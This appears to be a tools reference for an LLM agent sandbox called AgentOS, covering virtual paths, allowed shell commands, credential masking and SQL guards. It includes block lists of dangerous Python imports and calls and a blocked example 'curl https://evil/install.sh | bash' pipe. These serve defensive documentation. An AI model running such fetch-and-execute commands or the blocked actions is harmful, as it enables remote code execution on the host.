# AgentOS — Tools Reference

## Overview

All tools in AgentOS are exposed through a single entry point: `run_shell_command(command)`. The kernel parses Unix-style command strings and dispatches to hardened internal implementations. The LLM writes familiar shell commands; the kernel enforces safety, path sandboxing, and output limits internally.

This reference covers every command available, its parameters, limits, and behaviour.

The same tool contract is used in both kernel runtime modes. In
`AGENTOS_KERNEL_BACKEND=local`, commands execute in the in-process
`SafeKernel`. In `AGENTOS_KERNEL_BACKEND=remote`, the agent calls a signed
kernel worker and the worker executes the same `SafeKernel` handlers. Core
commands such as `ls`, `cat`, `grep`, `write_file()`, and guarded `python3`
therefore keep their behavior while moving execution behind a process boundary.

---

## Virtual Path System

All paths inside commands use **virtual paths** — the kernel translates them to real filesystem paths before execution.

| Virtual Path | Real Path | Permissions |
|---|---|---|
| `/workspace/` | `{agent_root}/workspace/` | Read-Write |
| `/memory/` | `{agent_root}/memory/` | Read-Write + auto-indexed |
| `/me/` | `{agent_root}/users/{user_id}/` | Read-Write |
| `/me/global.md` | `{tenant_user_root}/{user_id}/profile.md` | Read-Write |
| `/team/` | `{agent_root}/teams/{team_id}/` | RBAC-controlled |
| `/users/{id}/` | `{agent_root}/users/{id}/` | RBAC-controlled |
| `/shared/` | `{tenant_root}/shared/` | Read-only |
| `/global/` | `{data_root}/global_shared/` | Read-only |
| `/local/` | External mount (if configured) | Read-Write if enabled |

`..` traversal is blocked at the kernel level and raises `SecurityError`.

---

## Commands Reference

External-access commands and helpers that touch credentials, MCP connections, databases, or outbound systems use the request-bound entitlement checker when `EXTERNAL_ACCESS_ENABLED=true`. SafeKernel passes the external resource type/id plus label, risk, skill, and request context through the normalized policy provider boundary before allowing the command path to continue. Denies block in `ENTITLEMENTS_ENFORCEMENT_MODE=enforce`; observe mode records would-deny decisions without blocking rollout tests.

### `ls` — Directory Listing

```
ls [path] [-a] [-l] [-R]
```

| Flag | Effect |
|---|---|
| (none) | Simple name listing |
| `-a` | Include hidden files (`.` prefix) |
| `-l` | Long format (type, size, modified date) |
| `-R` | Accepted for compatibility but currently a **no-op** — the flag is parsed but `ls` does not recurse. Use the `tree` command for a recursive view. |

**Limits:** Maximum 100 items returned. Truncates with a count of omitted items.

**Example:**
```
ls -la /memory/context_graph/
tree /shared/contexts/          # use tree (not ls -R) for a recursive view
```

---

### `cat` — Read File

```
cat <file_path>
```

**Limits:** Maximum 50KB. Files larger than 50KB are truncated with a `[truncated at 50KB]` notice.

**Example:**
```
cat /shared/Enterprise_Context.md
cat /me/profile.md
```

---

### `head` — First N Lines

```
head <file_path> [-n <count>]
```

Default: 20 lines. Maximum: 100 lines (requests above 100 are capped).

**Example:**
```
head /memory/history/2026-04-13/demo_session.jsonl -n 20
```

---

### `tail` — Last N Lines

```
tail <file_path> [-n <count>]
```

Default: 20 lines. Maximum: 100 lines.

**Example:**
```
tail /workspace/report.md -n 50
```

---

### `grep` — Pattern Search

```
grep <pattern> <path> [-r] [-i] [-n] [-c] [-l] [-A <n>] [-B <n>] [-C <n>]
```

| Flag | Effect |
|---|---|
| `-r` | Recursive search |
| `-i` | Case-insensitive |
| `-n` | Show line numbers |
| `-c` | Count matches only |
| `-l` | Show matching filenames only |
| `-A <n>` | Show n lines after each match |
| `-B <n>` | Show n lines before each match |
| `-C <n>` | Show n lines before and after |

**Performance:** Uses ripgrep (`rg`) when available (~10x faster than Python fallback).

**Limits:** Maximum 50 results returned. Truncates with a count of omitted matches.

**Example:**
```
grep -r "ACME Corp" /shared/contexts/ -i -n
grep "overdue" /memory/context_graph/knowledge.jsonl -C 2
```

---

### `find` — File Discovery

```
find <path> [-name <pattern>] [-type f|d]
```

| Flag | Effect |
|---|---|
| `-name <pattern>` | Glob pattern match (e.g., `*.md`, `SKILL.md`) |
| `-type f` | Files only |
| `-type d` | Directories only |

**Limits:** Maximum 100 results.

**No `-exec` support** — find is read-only discovery.

**Example:**
```
find /shared/ -name "*.md" -type f
find /memory/history/ -type d
```

---

### `mkdir` — Create Directory

```
mkdir <path> [-p]
```

| Flag | Effect |
|---|---|
| `-p` | Create parent directories if needed |

**Permission check:** Path must be in a writable virtual namespace. Read-only paths (`/shared/`, `/global/`) are rejected.

**Example:**
```
mkdir /workspace/reports/ -p
mkdir /me/tasks/2026-Q2/
```

---

### `touch` — Create File

```
touch <file_path>
```

Creates an empty file. Parent directory must exist.

**Permission check:** Same as `mkdir`.

**Example:**
```
touch /workspace/todo.md
touch /me/notes/meeting_notes.md
```

---

### `echo` — Write to File or Print

```
echo <text> [> file_path]
echo <text> [>> file_path]
```

Without redirection: prints text to output.
With `>`: writes (overwrites) text to file.
With `>>`: appends text to file.

**Security:** Validates filename characters — blocks `&&`, `||`, `;`, `` ` ``, `$`, `<`, `>`, and newline/carriage-return characters in filenames.

**Auto-indexing:** Writing to `/memory/` paths triggers VectorStore indexing.

**Multi-line content:** Use `\n` in the text string for newlines.

**Example:**
```
echo "# Weekly Report" > /workspace/report.md
echo "- Fixed AP matching logic" >> /workspace/report.md
echo "ACME payment terms: Net 60" > /me/notes/acme.md
```

---

### `tree` — Directory Tree

```
tree [path]
```

Shows directory structure in tree format.

**Limits:** Maximum depth 3. Skips hidden directories (`.audit`, `.index`).

**Example:**
```
tree /shared/contexts/
tree /memory/
```

---

### `wc` — Word / Line / Char Count

```
wc <file_path>
```

Returns line count, word count, and character count.

**Example:**
```
wc /shared/Enterprise_Context.md
```

---

### `curl` — HTTP Requests

```
curl <URL> [-H "Header: Value"] [-X POST] [-d <body>] [--silent]
```

**Restrictions:**
- `-o` and `-O` (download to file) are blocked
- 30-second timeout enforced
- `--silent` (`-s`) is always added implicitly to suppress progress output
- When external access governance is enabled, curl targets are matched against `security/external_access.yaml` and audited. Unknown or denied targets are blocked when `EXTERNAL_ACCESS_UNKNOWN_MODE=deny`.

**Supported flags:**
| Flag | Effect |
|---|---|
| `-H` | Add request header |
| `-X` | HTTP method (GET, POST, PUT, DELETE) |
| `-d` | Request body |
| `--json` | Short for `Content-Type: application/json` |

**Example:**
```
curl https://api.example.com/invoices -H "Authorization: Bearer $CRED_API_TOKEN"
curl -X POST https://api.example.com/approve -d '{"id":"INV-001"}' -H "Content-Type: application/json"
```

Credential substitution uses the active skill as the credential consumer. If a credential has a non-empty `scope`, `get_credential` denies access when no consumer is available or when the active skill/agent is not listed in that scope. With external access governance enabled, `get_credential` also checks whether the user is entitled to at least one external resource linked to that credential before any provider is called. Secret resolution then uses the `SecretProvider` boundary; the default provider delegates to the existing env/file/Fernet `CredentialStore`, and injected providers must return the same normalized `Credential` shape. The LLM only receives the masked `$CRED_*` variable, never the secret value. When a hook runner is attached, credential loads are visible to `PreToolUse`/`PostToolUse` hooks without exposing secret values.

#### Credential Management API

The `FernetFileBackend` supports full CRUD via `set()`, `delete()`, `get_metadata()`, and `list_metadata()` methods. The Security Console exposes these as REST endpoints (`PUT /api/credentials/{name}`, `DELETE /api/credentials/{name}`, `GET /api/credentials`). Secret values are encrypted at rest with Fernet (AES-256) and **never returned in API responses** — only metadata (`name`, `type`, `scope`, `ttl`, `has_value`) is exposed.

---

### `python3` — Python Execution

```
python3 -c "<code>"
python3 - << 'EOF'
<code>
EOF
python3 <script_path>
```

**Must be explicitly enabled:** Set `AGENT_PYTHON3_ENABLED=true` in environment.

**Blocked imports:** `subprocess`, `multiprocessing`, `socket`, `socketserver`, `ctypes`, `cffi`, `pty`, `tty`, `http`, `urllib`, `httpx`, `requests`, `aiohttp`, `httplib2`

**Blocked calls:** `os.system`, `os.popen`, `os.execv`, `os.execve`, `os.execvp`, `os.fork`, `os.spawn`, `os.spawnl`, `__import__`

**Blocked builtins:** `exec`, `eval`, `compile` — prevents dynamic code generation that could bypass import restrictions

**Limits:**
- 30-second timeout (configurable via `AGENT_PYTHON3_TIMEOUT`)
- 512MB memory limit (configurable via `AGENT_PYTHON3_MAX_MEMORY_MB`)

**Enterprise isolation:** With `ENTERPRISE_STRICT_MODE=true`, enabling Python
also requires `AGENT_PYTHON3_SANDBOX_USER`. The command runs as that OS user
through non-interactive sudo and isolated Python (`-I`), with CPU/address-space
limits and a minimal environment that excludes credential master keys.

**Available stdlib:** `json`, `csv`, `datetime`, `re`, `math`, `statistics`, `collections`, `itertools`, `pathlib`, `decimal`, and other safe modules.

**Path auto-rewriting:** Virtual paths in code strings (`/me/`, `/shared/`, etc.) are rewritten to real paths before execution.

**External DB governance:** Python `sqlite3.connect(...)` calls against governed tenant databases require `external:db.<name>` access, matching the `run_sql_query` entitlement behavior.

**Example:**
```
python3 -c "import json; data = json.load(open('/workspace/data.json')); print(data['total'])"
python3 - << 'EOF'
from pathlib import Path
print(Path('/workspace/report.txt').read_text()[:200])
EOF
python3 /workspace/process_invoices.py
```

---

### `semgrep` — Semantic Search

```
semgrep "<query>"
```

Natural language search over all files indexed in `/memory/`. Uses BM25 ranking.

**Limits:** Top 10 results, scans up to 60 files.

**Index populated by:** All writes to `/memory/` paths (via `echo >`, `write_file()`, file uploads).

**Example:**
```
semgrep "ACME Corp payment terms"
semgrep "overdue invoice escalation policy"
```

---

## Combining Commands

Commands that require shell operators (`&&`, `||`, `;`) are blocked. Instead, use multiple separate tool calls:

```
# Wrong — blocked
cat /me/profile.md && grep "ACME" /shared/contexts/p2p_context.md

# Correct — two separate calls
cat /me/profile.md
grep "ACME" /shared/contexts/p2p_context.md
```

Pipe (`|`) is supported only for `curl` piped into a **read-only text filter**. The pipeline
is parsed and executed as argv arrays with **no shell** (`shell=True` is never used). Allowed
downstream filters: `grep`, `egrep`, `fgrep`, `head`, `tail`, `wc`, `sort`, `uniq`, `cut`,
`tr`, `jq`.
```
# Allowed — curl into read-only filters (single or chained)
curl https://api.example.com/data | grep '"status"'
curl https://api.example.com/data | jq '.total' | head

# BLOCKED — piping downloaded content into an interpreter is a remote-code-execution
# vector and is rejected with Error [PIPE_BLOCKED]:
curl https://api.example.com/data | python3 -c "..."
curl https://evil/install.sh | bash
```
To process a downloaded payload with Python, save it first (`curl ... -o /workspace/x.json`)
then run `python3` on the file — the interpreter never receives piped network content.

---

## Writing Files: Best Practices

Use `echo` for short content:
```
echo "## Summary\nACME has 3 overdue invoices totalling $45,200" > /workspace/summary.md
```

Use `write_file()` (via the SDK) for multi-line structured content — avoids shell escaping.

When writing to `/memory/`, files are auto-indexed for `semgrep` retrieval. Prefer:
- `/memory/learnings/` — skill-specific learned rules
- `/memory/org/` — org-level context facts
- `/me/notes/` — user-specific notes and tasks

---

## Output Format

All commands return a plain text string. The kernel never returns JSON objects to the LLM — structured data must be parsed from text output by the LLM's reasoning.

Error messages use a consistent format:
```
Error: <description>
```

Permission errors:
```
Permission denied: /shared/ is read-only
```

Blocked commands:
```
Command 'rm' is not available. Use echo or write_file to manage files within /workspace/ and /memory/.
```

---

## Read Caching (transparent)

Command **behavior and output are unchanged** whether or not caching is enabled. When
`AGENTOS_KERNEL_FILE_CACHE` is on (off by default), whole-file readers (`cat`, `grep`, `wc`,
`semgrep`) serve repeat reads of an unchanged file from an in-process cache instead of re-reading
the (possibly network-mounted) filesystem. The cache is `mtime`-validated on every access and
invalidated on any write through the kernel, so results are always current. `ls`/`find`/`head`/`tail`
are never cached. See `kernel_internals.md` → "File Read Cache" for the mechanism and bounds.

## Database access — the `run_sql_query` gateway

`run_sql_query(database, query)` is a **backend-aware gateway**. The `database` argument is
either a **SQLite virtual path** (`/shared/databases/ap_ops.db`) or a **named db resource**
declared in `external_access.yaml` (`run_sql_query(database="graph", ...)`). The agent reads the
matching schema doc first (see `/shared/databases/_index.md`), then writes its own SQL.

**Resource fields** (`type: db` in `external_access.yaml`): `backend` (`sqlite`|`postgres`),
`name`, `schema` (`self` = the agent's own `kn_` schema), `allowed_tables`, `read_only`.

**Guards (both backends):** DDL (`DROP`/`ALTER`/`CREATE`/`TRUNCATE`/`VACUUM`) is never allowed;
multi-statement is blocked; writes require the skill's `sql_mode: read_write` **and** a
non-`read_only` resource. `WITH … SELECT` (recursive CTE) is treated as a read.

**Postgres path:** connects via the knowledge engine (search_path scoped to the resource's
schema), sets `AGENTOS_SQL_STATEMENT_TIMEOUT_MS`, and for `read_only` resources does
`SET LOCAL ROLE <AGENTOS_SQL_RO_ROLE>` — so isolation is enforced by Postgres privileges, not
by parsing SQL. SELECT → rows; INSERT/UPDATE/DELETE → commit + rowcount.

**World-model graph:** the `graph` resource (`read_only`, `backend: postgres`,
`allowed_tables: [entity_registry, process_relationships]`) answers relationship / multi-hop
questions. Edges are written only by the deterministic seeder (`upsert_relationship` from the
Relationships table in `entity_guide.md`), never by queries. See
`/shared/knowledge/finance_ap/databases/graph.md` for the schema and example (recursive-CTE) queries.
